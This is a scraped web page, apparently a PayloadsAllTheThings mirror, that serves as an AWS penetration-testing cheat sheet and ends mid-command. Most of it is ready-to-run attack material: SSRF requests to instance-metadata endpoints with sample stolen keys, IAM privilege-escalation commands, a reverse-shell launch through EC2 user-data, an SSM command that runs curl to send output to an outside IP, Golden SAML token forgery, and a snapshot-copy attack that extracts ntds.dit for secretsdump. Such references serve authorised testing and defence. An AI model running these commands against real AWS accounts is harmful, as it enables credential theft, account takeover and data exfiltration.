Ensure IAM password policy requires at least one uppercase letter Ensure IAM password policy requires at least one lowercase letter Ensure IAM password policy requires at least one symbol Ensure IAM password policy requires at least one number Ensure IAM password policy requires minimum length of 14 or greater Ensure no root account access key exists Ensure MFA is enabled for the “root” account Ensure security questions are registered in the AWS account Ensure IAM policies are attached only to groups or role Enable detailed billing Maintain current contact details Ensure security contact information is registered Ensure IAM instance roles are used for AWS resource access from instances Logging Ensure CloudTrail is enabled in all regions Ensure CloudTrail log file validation is enabled Ensure the S3 bucket CloudTrail logs to is not publicly accessible Ensure CloudTrail trails are integrated with CloudWatch Logs Ensure AWS Config is enabled in all regions Ensure S3 bucket access logging is enabled on the CloudTrail S3 bucket Ensure CloudTrail logs are encrypted at rest using KMS CMKs Ensure rotation for customer created CMKs is enabled Networking Ensure no security groups allow ingress from 0.0.0.0/0 to port 22 Ensure no security groups allow ingress from 0.0.0.0/0 to port 3389 Ensure VPC flow logging is enabled in all VPC Ensure the default security group of every VPC restricts all traffic Monitoring Ensure a log metric filter and alarm exist for unauthorized API calls Ensure a log metric filter and alarm exist for Management Consolesign-in without MFA Ensure a log metric filter and alarm exist for usage of “root” account Ensure a log metric filter and alarm exist for IAM policy changes Ensure a log metric filter and alarm exist for CloudTrail configuration changes Ensure a log metric filter and alarm exist for AWS Management Console authentication failures Ensure a log metric filter and alarm exist for disabling or scheduled deletion of customer created CMKs Ensure a log metric filter and alarm exist for S3 bucket policy changes Ensure a log metric filter and alarm exist for AWS Config configuration changes Ensure a log metric filter and alarm exist for security group changes Ensure a log metric filter and alarm exist for changes to NetworkAccess Control Lists (NACL) Ensure a log metric filter and alarm exist for changes to network gateways Ensure a log metric filter and alarm exist for route table changes Ensure a log metric filter and alarm exist for VPC changes References An introduction to penetration testing AWS - Graceful Security Cloud Shadow Admin Threat 10 Permissions Protect - CyberArk My arsenal of AWS Security tools - toniblyx AWS Privilege Escalation method mitigation - RhinoSecurityLabs AWS CLI Cheatsheet - apolloclark Pacu Open source AWS Exploitation framework - RhinoSecurityLabs PACU Spencer Gietzen - 30 juil. 2018 Cloud security instance metadata - PumaScan Privilege escalation in the Cloud: From SSRF to Global Account Administrator - Maxime Leblanc - Sep 1, 2018 AWS - Cheatsheet - @Magnussen amazon-guardduty-user-guide PenTest Finding Types - @awsdocs HOW I HACKED A WHOLE EC2 NETWORK DURING A PENETRATION TEST - by Federico Fernandez How to Attach and Mount an EBS volume to EC2 Linux Instance - AUGUST 17, 2016 Getting shell and data access in AWS by chaining vulnerabilities - Riyaz Walikar - Aug 29, 2019 Getting started with Version 2 of AWS EC2 Instance Metadata service (IMDSv2) - Sunesh Govindaraj - Nov 25, 2019 Gaining AWS Console Access via API Keys - Ian Williams - March 18th, 2020 AWS API calls that return credentials - kmcquade" />
<link rel="canonical" href="http://localhost:4000/Cloud-AWS-Pentest/" />
<meta property="og:url" content="http://localhost:4000/Cloud-AWS-Pentest/" />
<meta property="og:site_name" content="PayloadsAllTheThings" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-05-01T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="AWS" />
<meta name="twitter:site" content="@Zxce3_" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"AWS","dateModified":"2021-05-01T00:00:00+07:00","datePublished":"2021-05-01T00:00:00+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Cloud-AWS-Pentest/"},"url":"http://localhost:4000/Cloud-AWS-Pentest/","description":"Amazon Web Services offers reliable, scalable, and inexpensive cloud computing services. Summary AWS Summary Training Tools AWS Patterns AWS - Metadata SSRF Method for Elastic Cloud Compute (EC2) Method for Container Service (Fargate) AWS API calls that return credentials AWS - Shadow Admin Admin equivalent permission AWS - Gaining AWS Console Access via API Keys AWS - Enumerate IAM permissions AWS - Mount EBS volume to EC2 Linux AWS - Copy EC2 using AMI Image AWS - Instance Connect - Push an SSH key to EC2 instance AWS - Lambda - Extract function’s code AWS - SSM - Command execution AWS - Golden SAML Attack AWS - Shadow Copy attack Disable CloudTrail Cover tracks by obfuscating Cloudtrail logs and Guard Duty DynamoDB Security checks References Training Damn Vulnerable Cloud Application - https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6 SadCloud - https://github.com/nccgroup/sadcloud Flaws - http://flaws.cloud Tools SkyArk - Discover the most privileged users in the scanned AWS environment, including the AWS Shadow Admins Requires read-Only permissions over IAM service ```powershell $ git clone https://github.com/cyberark/SkyArk $ powershell -ExecutionPolicy Bypass -NoProfile PS C&gt; Import-Module .\\SkyArk.ps1 -force PS C&gt; Start-AWStealth or in the Cloud Console PS C&gt; IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/cyberark/SkyArk/master/AWStealth/AWStealth.ps1’) PS C&gt; Scan-AWShadowAdmins ``` Pacu - Exploit configuration flaws within an AWS environment using an extensible collection of modules with a diverse feature-set Requires AWS Keys ```powershell $ git clone https://github.com/RhinoSecurityLabs/pacu $ bash install.sh $ python3 pacu.py set_keys/swap_keys ls run [--keyword-arguments] run --regions eu-west-1,us-west-1 # https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details ``` Bucket Finder - Search for public buckets, list and download all files if directory indexing is enabled 1 2 3 4 5 6 7 8 9 10 11 wget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O bucket_finder_1.1.tar.bz2 ./bucket_finder.rb my_words ./bucket_finder.rb --region ie my_words US Standard = http://s3.amazonaws.com Ireland = http://s3-eu-west-1.amazonaws.com Northern California = http://s3-us-west-1.amazonaws.com Singapore = http://s3-ap-southeast-1.amazonaws.com Tokyo = http://s3-ap-northeast-1.amazonaws.com ./bucket_finder.rb --download --region ie my_words ./bucket_finder.rb --log-file bucket.out my_words Boto3 - Amazon Web Services (AWS) SDK for Python 1 2 3 4 5 6 7 8 9 import boto3 # Create an S3 client s3 = boto3.client(&#39;s3&#39;,aws_access_key_id=&#39;AKIAJQDP3RKREDACTED&#39;,aws_secret_access_key=&#39;igH8yFmmpMbnkcUaCqXJIRIozKVaREDACTED&#39;,region_name=&#39;us-west-1&#39;) try: result = s3.list_buckets() print(result) except Exception as e: print(e) Prowler - AWS security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness It follows guidelines of the CIS Amazon Web Services Foundations Benchmark and DOZENS of additional checks including GDPR and HIPAA (+100). Require: arn:aws:iam::aws:policy/SecurityAudit 1 2 3 4 5 6 $ pip install awscli ansi2html detect-secrets $ git clone https://github.com/toniblyx/prowler $ sudo apt install jq $ ./prowler -E check42,check43 $ ./prowler -p custom-profile -r us-east-1 -c check11 $ ./prowler -A 123456789012 -R ProwlerRole # sts assume-role Principal Mapper - A tool for quickly evaluating IAM permissions in AWS 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 https://github.com/nccgroup/PMapper pip install principalmapper pmapper graph --create pmapper visualize --filetype png pmapper analysis --output-type text # Determine if PowerUser can escalate privileges pmapper query &quot;preset privesc user/PowerUser&quot; pmapper argquery --principal user/PowerUser --preset privesc # Find all principals that can escalate privileges pmapper query &quot;preset privesc *&quot; pmapper argquery --principal &#39;*&#39; --preset privesc # Find all principals that PowerUser can access pmapper query &quot;preset connected user/PowerUser *&quot; pmapper argquery --principal user/PowerUser --resource &#39;*&#39; --preset connected # Find all principals that can access PowerUser pmapper query &quot;preset connected * user/PowerUser&quot; pmapper argquery --principal &#39;*&#39; --resource user/PowerUser --preset connected ScoutSuite - Multi-Cloud Security Auditing Tool 1 2 3 4 5 $ git clone https://github.com/nccgroup/ScoutSuite $ python scout.py PROVIDER --help # The --session-token is optional and only used for temporary credentials (i.e. role assumption). $ python scout.py aws --access-keys --access-key-id &lt;AKIAIOSFODNN7EXAMPLE&gt; --secret-access-key &lt;wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY&gt; --session-token &lt;token&gt; $ python scout.py azure --cli s3_objects_check - Whitebox evaluation of effective S3 object permissions, to identify publicly accessible files 1 2 3 4 5 $ git clone https://github.com/nccgroup/s3_objects_check $ python3 -m venv env &amp;&amp; source env/bin/activate $ pip install -r requirements.txt $ python s3-objects-check.py -h $ python s3-objects-check.py -p whitebox-profile -e blackbox-profile cloudsplaining - An AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized report 1 2 3 $ pip3 install --user cloudsplaining $ cloudsplaining download --profile myawsprofile $ cloudsplaining scan --input-file default.json weirdAAL - AWS Attack Library 1 2 3 python3 weirdAAL.py -m ec2_describe_instances -t demo python3 weirdAAL.py -m lambda_get_account_settings -t demo python3 weirdAAL.py -m lambda_get_function -a &#39;MY_LAMBDA_FUNCTION&#39;,&#39;us-west-2&#39; -t yolo cloudmapper - CloudMapper helps you analyze your Amazon Web Services (AWS) environments 1 2 3 4 5 6 7 8 9 10 11 git clone https://github.com/duo-labs/cloudmapper.git # sudo yum install autoconf automake libtool python3-devel.x86_64 python3-tkinter python-pip jq awscli # You may additionally need &quot;build-essential&quot; sudo apt-get install autoconf automake libtool python3.7-dev python3-tk jq awscli pipenv install --skip-lock pipenv shell report: Generate HTML report. Includes summary of the accounts and audit findings. iam_report: Generate HTML report for the IAM information of an account. audit: Check for potential misconfigurations. collect: Collect metadata about an account. find_admins: Look at IAM policies to identify admin users and roles, or principals with specific privileges dufflebag - Find secrets that are accidentally exposed via Amazon EBS’s “public” mode AWS Patterns | Service | URL | |————-|——–| | s3 | https://{user_provided}.s3.amazonaws.com | | cloudfront | https://{random_id}.cloudfront.net | | ec2 | ec2-{ip-seperated}.compute-1.amazonaws.com | | es | https://{user_provided}-{random_id}.{region}.es.amazonaws.com | | elb | http://{user_provided}-{random_id}.{region}.elb.amazonaws.com:80/443 | | elbv2 | https://{user_provided}-{random_id}.{region}.elb.amazonaws.com | | rds | mysql://{user_provided}.{random_id}.{region}.rds.amazonaws.com:3306 | | rds | postgres://{user_provided}.{random_id}.{region}.rds.amazonaws.com:5432 | | route 53 | {user_provided} | | execute-api | https://{random_id}.execute-api.{region}.amazonaws.com/{user_provided} | | cloudsearch | https://doc-{user_provided}-{random_id}.{region}.cloudsearch.amazonaws.com | | transfer | sftp://s-{random_id}.server.transfer.{region}.amazonaws.com | | iot | mqtt://{random_id}.iot.{region}.amazonaws.com:8883 | | iot | https://{random_id}.iot.{region}.amazonaws.com:8443 | | iot | https://{random_id}.iot.{region}.amazonaws.com:443 | | mq | https://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:8162 | | mq | ssl://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:61617 | | kafka | b-{1,2,3,4}.{user_provided}.{random_id}.c{1,2}.kafka.{region}.amazonaws.com | | kafka | {user_provided}.{random_id}.c{1,2}.kafka.useast-1.amazonaws.com | | cloud9 | https://{random_id}.vfs.cloud9.{region}.amazonaws.com | | mediastore | https://{random_id}.data.mediastore.{region}.amazonaws.com | | kinesisvideo | https://{random_id}.kinesisvideo.{region}.amazonaws.com | | mediaconvert | https://{random_id}.mediaconvert.{region}.amazonaws.com | | mediapackage | https://{random_id}.mediapackage.{region}.amazonaws.com/in/v1/{random_id}/channel | AWS - Metadata SSRF AWS released additional security defences against the attack. :warning: Only working with IMDSv1. Enabling IMDSv2 : aws ec2 modify-instance-metadata-options --instance-id &lt;INSTANCE-ID&gt; --profile &lt;AWS_PROFILE&gt; --http-endpoint enabled --http-token required. In order to usr IMDSv2 you must provide a token. 1 2 export TOKEN=`curl -X PUT -H &quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot; &quot;http://169.254.169.254/latest/api/token&quot;` curl -H &quot;X-aws-ec2-metadata-token:$TOKEN&quot; -v &quot;http://169.254.169.254/latest/meta-data&quot; Method for Elastic Cloud Compute (EC2) Example : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/ Access the IAM : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/ 1 2 3 4 5 6 7 8 9 10 ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hostname iam/ identity-credentials/ instance-action instance-id Find the name of the role assigned to the instance : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/ Extract the role’s temporary keys : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/ 1 2 3 4 5 6 7 8 9 { &quot;Code&quot; : &quot;Success&quot;, &quot;LastUpdated&quot; : &quot;2019-07-31T23:08:10Z&quot;, &quot;Type&quot; : &quot;AWS-HMAC&quot;, &quot;AccessKeyId&quot; : &quot;ASIA54BL6PJR37YOEP67&quot;, &quot;SecretAccessKey&quot; : &quot;OiAjgcjm1oi2xxxxxxxxOEXkhOMhCOtJMP2&quot;, &quot;Token&quot; : &quot;AgoJb3JpZ2luX2VjEDU86Rcfd/34E4rtgk8iKuTqwrRfOppiMnv&quot;, &quot;Expiration&quot; : &quot;2019-08-01T05:20:30Z&quot; } Method for Container Service (Fargate) Fetch the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI variable from https://awesomeapp.com/download?file=/proc/self/environ 1 2 3 4 5 JAVA_ALPINE_VERSION=8.212.04-r0 HOSTNAME=bbb3c57a0ed3SHLVL=1PORT=8443HOME=/root AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447 AWS_EXECUTION_ENV=AWS_ECS_FARGATEMVN_VER=3.3.9JAVA_VERSION=8u212AWS_DEFAULT_REGION=us-west-2 ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/cb4f6285-48f2-4a51-a787-67dbe61c13ffPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin:/usr/lib/mvn:/usr/lib/mvn/binLANG=C.UTF-8AWS_REGION=us-west-2Tag=48111bbJAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jreM2=/usr/lib/mvn/binPWD=/appM2_HOME=/usr/lib/mvnLD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjd Use the credential URL to dump the AccessKey and SecretKey : https://awesomeapp.com/forward?target=http://169.254.170.2/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447 1 2 3 4 5 6 7 { &quot;RoleArn&quot;: &quot;arn:aws:iam::953574914659:role/awesome-waf-role&quot;, &quot;AccessKeyId&quot;: &quot;ASIA54BL6PJR2L75XHVS&quot;, &quot;SecretAccessKey&quot;: &quot;j72eTy+WHgIbO6zpe2DnfjEhbObuTBKcemfrIygt&quot;, &quot;Token&quot;: &quot;FQoGZXIvYXdzEMj//////////wEaDEQW+wwBtaoyqH5lNSLGBF3PnwnLYa3ggfKBtLMoWCEyYklw6YX85koqNwKMYrP6ymcjv4X2gF5enPi9/Dx6m/1TTFIwMzZ3tf4V3rWP3HDt1ea6oygzTrWLvfdp57sKj+2ccXI+WWPDZh3eJr4Wt4JkiiXrWANn7Bx3BUj9ZM11RXrKRCvhrxdrMLoewRkWmErNEOFgbaCaT8WeOkzqli4f+Q36ZerT2V+FJ4SWDX1CBsimnDAMAdTIRSLFxVBBwW8171OHiBOYAMK2np1xAW1d3UCcZcGKKZTjBee2zs5+Rf5Nfkoq+j7GQkmD2PwCeAf0RFETB5EVePNtlBWpzfOOVBtsTUTFewFfx5cyNsitD3C2N93WR59LX/rNxyncHGDUP/6UPlasOcfzAaG738OJQmWfQTR0qksHIc2qiPtkstnNndh76is+r+Jc4q3wOWu2U2UBi44Hj+OS2UTpMAwc/MshIiGsUOrBQdPqcLLdAxKpUNTdSQNLg5wv4f2OrOI8/sneV58yBRolBz8DZoH8wohtLXpueDt8jsVSVLznnMOOe/4ehHE2Nt+Fy+tjaY5FUi/Ijdd5IrIdIvWFHY1XcPopUFYrDqr0yuZvX1YddfIcfdbmxf274v69FuuywXTo7cXk1QTMYZWlD/dPI/k6KQeO446UrHT9BJxcJMpchAIVRpI7nVKkSDwku1joKUG7DOeycuAbhecVZG825TocL0ks2yXPnIdvckAaU9DZf+afIV3Nxv3TI4sSX1npBhb2f/8C31pv8VHyu2NiN5V6OOHzZijHsYXsBQ==&quot;, &quot;Expiration&quot;: &quot;2019-09-18T04:05:59Z&quot; } AWS API calls that return credentials chime:createapikey codepipeline:pollforjobs cognito-identity:getopenidtoken cognito-identity:getopenidtokenfordeveloperidentity cognito-identity:getcredentialsforidentity connect:getfederationtoken connect:getfederationtokens ecr:getauthorizationtoken gamelift:requestuploadcredentials iam:createaccesskey iam:createloginprofile iam:createservicespecificcredential iam:resetservicespecificcredential iam:updateaccesskey lightsail:getinstanceaccessdetails lightsail:getrelationaldatabasemasteruserpassword rds-db:connect redshift:getclustercredentials sso:getrolecredentials mediapackage:rotatechannelcredentials mediapackage:rotateingestendpointcredentials sts:assumerole sts:assumerolewithsaml sts:assumerolewithwebidentity sts:getfederationtoken sts:getsessiontoken AWS - Shadow Admin Admin equivalent permission AdministratorAccess 1 2 &quot;Action&quot;: &quot;*&quot; &quot;Resource&quot;: &quot;*&quot; ec2:AssociateIamInstanceProfile iam:CreateAccessKeyiam:CreateAccessKey : create a new access key to another IAM admin account 1 aws iam create-access-key –user-name target_user iam:CreateLoginProfile : add a new password-based login profile, set a new password for an entity and impersonate it 1 $ aws iam create-login-profile –user-name target_user –password &#39;|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z”,jJ[iT-D^(&#39; –no-password-reset-required iam:UpdateLoginProfile : reset other IAM users’ login passwords. 1 $ aws iam update-login-profile –user-name target_user –password &#39;|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z”,jJ[iT-D^(&#39; –no-password-reset-required iam:AttachUserPolicy, iam:AttachGroupPolicy or iam:AttachRolePolicy : attach existing admin policy to any other entity he currently possesses 1 2 3 $ aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess $ aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess $ aws iam attach-role-policy –role-name role_i_can_assume –policy-arn arn:aws:iam::aws:policy/AdministratorAccess iam:PutUserPolicy, iam:PutGroupPolicy or iam:PutRolePolicy : added inline policy will allow the attacker to grant additional privileges to previously compromised entities. 1 $ aws iam put-user-policy –user-name my_username –policy-name my_inline_policy –policy-document file://path/to/administrator/policy.json iam:CreatePolicy : add a stealthy admin policy iam:AddUserToGroup : add into the admin group of the organization. 1 $ aws iam add-user-to-group –group-name target_group –user-name my_username iam:UpdateAssumeRolePolicy + sts:AssumeRole : change the assuming permissions of a privileged role and then assume it with a non-privileged account. 1 $ aws iam update-assume-role-policy –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json iam:CreatePolicyVersion &amp; iam:SetDefaultPolicyVersion : change customer-managed policies and change a non-privileged entity to be a privileged one. 1 2 $ aws iam create-policy-version –policy-arn target_policy_arn –policy-document file://path/to/administrator/policy.json –set-as-default $ aws iam set-default-policy-version –policy-arn target_policy_arn –version-id v2 lambda:UpdateFunctionCode : give an attacker access to the privileges associated with the Lambda service role that is attached to that function. 1 $ aws lambda update-function-code –function-name target_function –zip-file fileb://my/lambda/code/zipped.zip glue:UpdateDevEndpoint : give an attacker access to the privileges associated with the role attached to the specific Glue development endpoint. 1 $ aws glue –endpoint-name target_endpoint –public-key file://path/to/my/public/ssh/key.pub iam:PassRole + ec2:CreateInstanceProfile/ec2:AddRoleToInstanceProfile : an attacker could create a new privileged instance profile and attach it to a compromised EC2 instance that he possesses. iam:PassRole + ec2:RunInstance : give an attacker access to the set of permissions that the instance profile/role has, which again could range from no privilege escalation to full administrator access of the AWS account. 1 2 3 4 # add ssh key $ aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –key-name my_ssh_key –security-group-ids sg-123456 # execute a reverse shell $ aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –user-data file://script/with/reverse/shell.sh iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction : give a user access to the privileges associated with any Lambda service role that exists in the account. 1 2 $ aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py $ aws lambda invoke –function-name my_function output.txt Example of code.py 1 2 3 4 5 6 7 8 import boto3 def lambda_handler(event, context): client = boto3.client(&#39;iam&#39;) response = client.attach_user_policy( UserName=&#39;my_username&#39;, PolicyArn=&quot;arn:aws:iam::aws:policy/AdministratorAccess&quot; ) return response iam:PassRole + glue:CreateDevEndpoint : access to the privileges associated with any Glue service role that exists in the account. 1 $ aws glue create-dev-endpoint –endpoint-name my_dev_endpoint –role-arn arn_of_glue_service_role –public-key file://path/to/my/public/ssh/key.pub AWS - Gaining AWS Console Access via API Keys A utility to convert your AWS CLI credentials into AWS console access. 1 2 3 4 5 6 7 8 9 10 $&gt; git clone https://github.com/NetSPI/aws_consoler $&gt; aws_consoler -v -a AKIA[REDACTED] -s [REDACTED] 2020-03-13 19:44:57,800 [aws_consoler.cli] INFO: Validating arguments... 2020-03-13 19:44:57,801 [aws_consoler.cli] INFO: Calling logic. 2020-03-13 19:44:57,820 [aws_consoler.logic] INFO: Boto3 session established. 2020-03-13 19:44:58,193 [aws_consoler.logic] WARNING: Creds still permanent, creating federated session. 2020-03-13 19:44:58,698 [aws_consoler.logic] INFO: New federated session established. 2020-03-13 19:44:59,153 [aws_consoler.logic] INFO: Session valid, attempting to federate as arn:aws:sts::123456789012:federated-user/aws_consoler. 2020-03-13 19:44:59,668 [aws_consoler.logic] INFO: URL generated! https://signin.aws.amazon.com/federation?Action=login&amp;Issuer=consoler.local&amp;Destination=https%3A%2F%2Fconsole.aws.amazon.com%2Fconsole%2Fhome%3Fregion%3Dus-east-1&amp;SigninToken=[REDACTED AWS - Enumerate IAM permissions Enumerate the permissions associated with AWS credential set with enumerate-iam 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 git clone git@github.com:andresriancho/enumerate-iam.git pip install -r requirements.txt ./enumerate-iam.py --access-key AKIA... --secret-key StF0q... 2019-05-10 15:57:58,447 - 21345 - [INFO] Starting permission enumeration for access-key-id &quot;AKIA...&quot; 2019-05-10 15:58:01,532 - 21345 - [INFO] Run for the hills, get_account_authorization_details worked! 2019-05-10 15:58:01,537 - 21345 - [INFO] -- { &quot;RoleDetailList&quot;: [ { &quot;Tags&quot;: [], &quot;AssumeRolePolicyDocument&quot;: { &quot;Version&quot;: &quot;2008-10-17&quot;, &quot;Statement&quot;: [ { ... 2019-05-10 15:58:26,709 - 21345 - [INFO] -- gamelift.list_builds() worked! 2019-05-10 15:58:26,850 - 21345 - [INFO] -- cloudformation.list_stack_sets() worked! 2019-05-10 15:58:26,982 - 21345 - [INFO] -- directconnect.describe_locations() worked! 2019-05-10 15:58:27,021 - 21345 - [INFO] -- gamelift.describe_matchmaking_rule_sets() worked! 2019-05-10 15:58:27,311 - 21345 - [INFO] -- sqs.list_queues() worked! AWS - Mount EBS volume to EC2 Linux :warning: EBS snapshots are block-level incremental, which means that every snapshot only copies the blocks (or areas) in the volume that had been changed since the last snapshot. To restore your data, you need to create a new EBS volume from one of your EBS snapshots. The new volume will be a duplicate of the initial EBS volume on which the snapshot was taken. Head over to EC2 –&gt; Volumes and create a new volume of your preferred size and type. Select the created volume, right click and select the “attach volume” option. Select the instance from the instance text box as shown below : attach ebs volume 1 2 aws ec2 create-volume –snapshot-id snapshot_id --availability-zone zone aws ec2 attach-volume –-volume-id volume_id –-instance-id instance_id --device device Now, login to your ec2 instance and list the available disks using the following command : lsblk Check if the volume has any data using the following command : sudo file -s /dev/xvdf Format the volume to ext4 filesystem using the following command : sudo mkfs -t ext4 /dev/xvdf Create a directory of your choice to mount our new ext4 volume. I am using the name “newvolume” : sudo mkdir /newvolume Mount the volume to “newvolume” directory using the following command : sudo mount /dev/xvdf /newvolume/ cd into newvolume directory and check the disk space for confirming the volume mount : cd /newvolume; df -h . AWS - Copy EC2 using AMI Image First you need to extract data about the current instances and their AMI/security groups/subnet : aws ec2 describe-images --region eu-west-1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # create a new image for the instance-id $ aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name &quot;AWS Audit&quot; --description &quot;Export AMI&quot; --region eu-west-1 # add key to AWS $ aws ec2 import-key-pair --key-name &quot;AWS Audit&quot; --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1 # create ec2 using the previously created AMI, use the same security group and subnet to connect easily. $ aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids &quot;sg-6d0d7f01&quot; --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name &quot;AWS Audit&quot; --query &quot;Instances[0].InstanceId&quot; --region eu-west-1 # now you can check the instance aws ec2 describe-instances --instance-ids i-0546910a0c18725a1 # If needed : edit groups aws ec2 modify-instance-attribute --instance-id &quot;i-0546910a0c18725a1&quot; --groups &quot;sg-6d0d7f01&quot; --region eu-west-1 # be a good guy, clean our instance to avoid any useless cost aws ec2 stop-instances --instance-id &quot;i-0546910a0c18725a1&quot; --region eu-west-1 aws ec2 terminate-instances --instance-id &quot;i-0546910a0c18725a1&quot; --region eu-west-1 AWS - Instance Connect - Push an SSH key to EC2 instance 1 2 3 # https://aws.amazon.com/fr/blogs/compute/new-using-amazon-ec2-instance-connect-for-ssh-access-to-your-ec2-instances/ $ aws ec2 describe-instances --profile uploadcreds --region eu-west-1 | jq &quot;.[][].Instances | .[] | {InstanceId, KeyName, State}&quot; $ aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id INSTANCE --availability-zone us-east-1d --instance-os-user ubuntu --ssh-public-key file://shortkey.pub --profile uploadcreds AWS - Lambda - Extract function’s code 1 2 3 4 # https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed $ aws lambda list-functions --profile uploadcreds $ aws lambda get-function --function-name &quot;LAMBDA-NAME-HERE-FROM-PREVIOUS-QUERY&quot; --query &#39;Code.Location&#39; --profile uploadcreds $ wget -O lambda-function.zip url-from-previous-query --profile uploadcreds AWS - SSM - Command execution :warning: The ssm-user account is not removed from the system when SSM Agent is uninstalled. SSM Agent is preinstalled, by default, on the following Amazon Machine Images (AMIs): Windows Server 2008-2012 R2 AMIs published in November 2016 or later Windows Server 2016 and 2019 Amazon Linux Amazon Linux 2 Ubuntu Server 16.04 Ubuntu Server 18.04 Amazon ECS-Optimized 1 2 3 4 5 6 $ aws ssm describe-instance-information --profile stolencreds --region eu-west-1 $ aws ssm send-command --instance-ids &quot;INSTANCE-ID-HERE&quot; --document-name &quot;AWS-RunShellScript&quot; --comment &quot;IP Config&quot; --parameters commands=ifconfig --output text --query &quot;Command.CommandId&quot; --profile stolencreds $ aws ssm list-command-invocations --command-id &quot;COMMAND-ID-HERE&quot; --details --query &quot;CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}&quot; --profile stolencreds e.g: $ aws ssm send-command --instance-ids &quot;i-05b████████adaa&quot; --document-name &quot;AWS-RunShellScript&quot; --comment &quot;whoami&quot; --parameters commands=&#39;curl 162.243.███.███:8080/`whoami`&#39; --output text --region=us-east-1 AWS - Golden SAML Attack https://www.youtube.com/watch?v=5dj4vOqqGZw https://www.cyberark.com/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-cloud-apps/ Using the extracted information, the tool will generate a forged SAML token as an arbitrary user that can then be used to authenticate to Office 365 without knowledge of that user’s password. This attack also bypasses any MFA requirements. Requirement: Token-signing private key (export from personal store using Mimikatz) IdP public certificate IdP name Role name (role to assume) 1 2 3 $ python -m pip install boto3 botocore defusedxml enum python_dateutil lxml signxml $ python .\\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 AWS - Shadow Copy attack Prerequisite: EC2:CreateSnapshot CloudCopy - https://github.com/Static-Flow/CloudCopy Load AWS CLI with Victim Credentials that have at least CreateSnapshot permissions Run &quot;Describe-Instances&quot; and show in list for attacker to select Run &quot;Create-Snapshot&quot; on volume of selected instance Run &quot;modify-snapshot-attribute&quot; on new snapshot to set &quot;createVolumePermission&quot; to attacker AWS Account Load AWS CLI with Attacker Credentials Run &quot;run-instance&quot; command to create new linux ec2 with our stolen snapshot Ssh run &quot;sudo mkdir /windows&quot; Ssh run &quot;sudo mount /dev/xvdf1 /windows/&quot; Ssh run &quot;sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user&quot; Ssh run &quot;sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user&quot; Ssh run &quot;sudo chown ec2-user:ec2-user /home/ec2-user/*&quot; SFTP get &quot;/home/ec2-user/SYSTEM ./SYSTEM&quot; SFTP get &quot;/home/ec2-user/ntds.dit ./ntds.dit&quot; locally run &quot;secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile 